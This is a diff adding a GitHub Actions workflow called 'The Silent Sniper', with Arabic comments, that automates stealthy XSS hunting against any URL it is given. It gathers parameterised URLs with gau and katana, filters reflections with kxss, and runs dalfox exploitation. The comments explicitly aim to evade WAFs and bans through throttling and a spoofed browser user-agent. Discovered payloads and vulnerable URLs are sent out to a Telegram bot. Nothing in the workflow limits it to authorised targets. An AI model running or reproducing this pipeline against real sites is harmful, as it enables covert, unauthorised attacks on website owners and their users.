@@ -1,0 +1,141 @@
+name: V32 - The Silent Sniper (Manual & Stealth)
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Enter Exact Target URL (e.g., https://example.com)'
+        required: true
+
+jobs:
+  sniper-job:
+    runs-on: ubuntu-latest
+    # تحديد وقت أقصى للعملية عشان لو علقت متسحبش رصيدك أو تاخد بان
+    timeout-minutes: 45 
+    
+    steps:
+      - name: Setup Go Environment
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      # 1. تثبيت الأدوات (بدون Subfinder)
+      - name: Install Stealth Arsenal
+        run: |
+          echo "🛠️ Installing tools..."
+          # أدوات جمع الروابط
+          go install -v github.com/lc/gau/v2/cmd/gau@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          
+          # أدوات الفحص
+          go install -v github.com/emn178/kxss@latest
+          go install -v github.com/hahwul/dalfox/v2@latest
+          
+          # أدوات مساعدة
+          sudo apt-get update && sudo apt-get install -y jq
+
+      # 2. جمع الروابط بدقة (Discovery)
+      - name: 1. Surgical Recon (Parameters)
+        run: |
+          TARGET="${{ inputs.target }}"
+          echo "🎯 Locking on target: $TARGET"
+          
+          # أ. البحث في الأرشيف (GAU)
+          # --threads 2: تقليل السرعة لتجنب المشاكل
+          echo "⏳ Fetching archived URLs..."
+          gau "$TARGET" --threads 2 --blacklist png,jpg,gif,css,js,woff,svg,pdf,ico | grep "=" > gau_urls.txt || true
+          
+          # ب. الزحف المباشر (Katana)
+          # -c 2: طلبين بس في نفس الوقت
+          # -d 3: عمق 3 فقط
+          # -s quiet: وضع صامت
+          echo "🕷️ Crawling live URLs (Stealth Mode)..."
+          katana -u "$TARGET" -c 2 -d 3 -kf all -s quiet -f qurl | grep "=" > katana_urls.txt || true
+          
+          # ج. دمج وتنظيف
+          cat gau_urls.txt katana_urls.txt | sort -u > all_params.txt
+          
+          COUNT=$(wc -l < all_params.txt)
+          echo "✅ Total Parameters Found: $COUNT"
+          
+          # لو العدد ضخم جداً، ناخد أول 500 بس عشان الأمان والوقت
+          if [ "$COUNT" -gt 500 ]; then
+            echo "⚠️ List too long! Trimming to top 500 to avoid bans."
+            head -n 500 all_params.txt > temp_params.txt && mv temp_params.txt all_params.txt
+          fi
+
+      # 3. الفلترة الذكية (KXSS)
+      - name: 2. Reflection Check
+        run: |
+          echo "✨ Checking for reflections..."
+          if [ -s all_params.txt ]; then
+            cat all_params.txt | kxss > kxss_out.txt || true
+            # استخراج الروابط المصابة فقط
+            awk '{print $9}' kxss_out.txt > targets_ready.txt
+          else
+            echo "❌ No parameters found to check."
+            touch targets_ready.txt
+          fi
+          echo "🎯 Reflected Params: $(wc -l < targets_ready.txt)"
+
+      # 4. الهجوم الصامت (DalFox Stealth)
+      - name: 3. Exploitation (Stealth Mode)
+        run: |
+          echo "🚀 Starting DalFox (Sniper Mode)..."
+          
+          # إعدادات الأمان والاحترافية:
+          # --delay 1000 : ثانية كاملة بين كل طلب والتاني (مهم جداً للـ WAF)
+          # --worker 2 : عاملين فقط شغالين
+          # --skip-bav : تخطي فحوصات الـ Blind (لأنها بتعمل دوشة كتير)
+          # --silence : عشان اللوج ميبقاش ضخم
+          
+          if [ -s targets_ready.txt ]; then
+             dalfox file targets_ready.txt \
+             --delay 1000 \
+             --worker 2 \
+             --skip-bav \
+             --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" \
+             --format json -o dalfox_results.json
+          elif [ -s all_params.txt ]; then
+             echo "⚠️ No direct reflections found. Trying fallback scan on raw params (Top 50)..."
+             head -n 50 all_params.txt | dalfox pipe \
+             --delay 1500 \
+             --worker 1 \
+             --skip-bav \
+             --format json -o dalfox_results.json
+          fi
+
+      # 5. التبليغ
+      - name: Alert System
+        if: always()
+        env:
+          TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          TARGET="${{ inputs.target }}"
+          if [ -f dalfox_results.json ] && [ -s dalfox_results.json ]; then
+            # إرسال الثغرات المكتشفة
+            cat dalfox_results.json | jq -c '.' | while read line; do
+              TYPE=$(echo $line | jq -r '.type')
+              SEVERITY=$(echo $line | jq -r '.severity')
+              PAYLOAD=$(echo $line | jq -r '.payload')
+              URL=$(echo $line | jq -r '.url')
+              
+              MSG="🎯 **SNIPER HIT!**
+              🌐 Target: \`$TARGET\`
+              🐛 Bug: $TYPE ($SEVERITY)
+              💣 Payload: \`$PAYLOAD\`
+              🔗 URL: \`$URL\`"
+              
+              curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+              sleep 2 # استراحة عشان التليجرام ميعملش بلوك للرسائل
+            done
+          else
+             # تقرير بالفشل أو النظافة
+             MSG="✅ **Scan Finished (Clean/Silent).**
+             🎯 Target: \`$TARGET\`
+             🔍 Params Checked: $(wc -l < all_params.txt)
+             🛡️ Status: Secure or WAF Blocked."
+             
+             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+          fi
